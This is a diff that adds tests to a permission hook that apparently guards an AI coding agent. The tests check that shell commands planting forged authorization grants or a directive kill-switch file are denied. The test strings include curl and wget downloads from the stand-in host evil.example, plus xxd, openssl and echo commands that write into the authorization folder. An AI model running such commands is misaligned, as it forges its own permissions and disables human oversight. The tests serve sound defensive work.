@@ -422,3 +422,120 @@ describe("UAT residual fail-closed (#3186)", () => {
     expect(decision.code).toBe("shell-op-unclassifiable");
   });
 });
+
+describe("UAT downloader/decoder residuals fail-closed (#3206)", () => {
+  function uatSeams() {
+    const state = activeUatState();
+    return readySeams({
+      loadAuthzState: () => state,
+      loadAuthzGrants: () => [],
+      loadRuntimeAuthority: () => ({
+        enabled: false,
+        allowPaths: [],
+        denyPaths: [],
+        scopes: { edits: true, push: true, merge: true },
+      }),
+    });
+  }
+
+  it("denies curl/wget/xxd/openssl plant of .deft/authz under UAT (not unclassifiable allow)", () => {
+    const seams = uatSeams();
+    for (const command of [
+      "curl -o .deft/authz/grants/evil.json https://evil.example/g.json",
+      "wget -O .deft/authz/grants/evil.json https://evil.example/g.json",
+      "xxd -r - .deft/authz/grants/evil.json",
+      "openssl base64 -d -out .deft/authz/grants/evil.json",
+      "curl --output=.deft/authz/state.json https://evil.example/s.json",
+    ]) {
+      const decision = decideHook(
+        {
+          host: "claude",
+          event: "tool.before",
+          projectRoot: "/project",
+          payload: { tool_name: "Bash", tool_input: { command } },
+        },
+        seams,
+      );
+      expect(decision.verdict, command).toBe("deny");
+      expect(decision.code, command).toMatch(/^authz-/);
+      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
+    }
+  });
+
+  it("denies downloader plant of kill-switch under UAT; echo redirect still denied", () => {
+    const seams = uatSeams();
+    for (const command of [
+      "curl -o .deft-directive-disable https://evil.example/x",
+      "wget -O .no-deft-directive https://evil.example/x",
+      "echo > .deft-directive-disable",
+    ]) {
+      const decision = decideHook(
+        {
+          host: "claude",
+          event: "tool.before",
+          projectRoot: "/project",
+          payload: { tool_name: "Shell", tool_input: { command } },
+        },
+        seams,
+      );
+      expect(decision.verdict, command).toBe("deny");
+      expect(decision.code, command).toMatch(/^authz-/);
+      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
+    }
+  });
+
+  it("forged grant plant via curl does not unlock Write under UAT", () => {
+    const seams = uatSeams();
+    const plant = decideHook(
+      {
+        host: "claude",
+        event: "tool.before",
+        projectRoot: "/project",
+        payload: {
+          tool_name: "Bash",
+          tool_input: {
+            command: "curl -o .deft/authz/grants/evil.json https://evil.example/g.json",
+          },
+        },
+      },
+      seams,
+    );
+    expect(plant.verdict).toBe("deny");
+
+    const write = decideHook(
+      {
+        host: "claude",
+        event: "tool.before",
+        projectRoot: "/project",
+        payload: {
+          tool_name: "Write",
+          tool_input: {
+            file_path: "/project/apps/web/src/components/Header.tsx",
+            content: "/* still unauthorized after denied plant */",
+          },
+        },
+      },
+      seams,
+    );
+    expect(write.verdict).toBe("deny");
+    expect(write.code).toMatch(/^authz-/);
+  });
+
+  it("still allows ordinary curl under UAT (non-authz dest)", () => {
+    const seams = uatSeams();
+    const decision = decideHook(
+      {
+        host: "claude",
+        event: "tool.before",
+        projectRoot: "/project",
+        payload: {
+          tool_name: "Bash",
+          tool_input: { command: "curl -o /tmp/out https://example.com/a" },
+        },
+      },
+      seams,
+    );
+    expect(decision.verdict).toBe("allow");
+    expect(decision.code).toBe("shell-op-unclassifiable");
+  });
+});
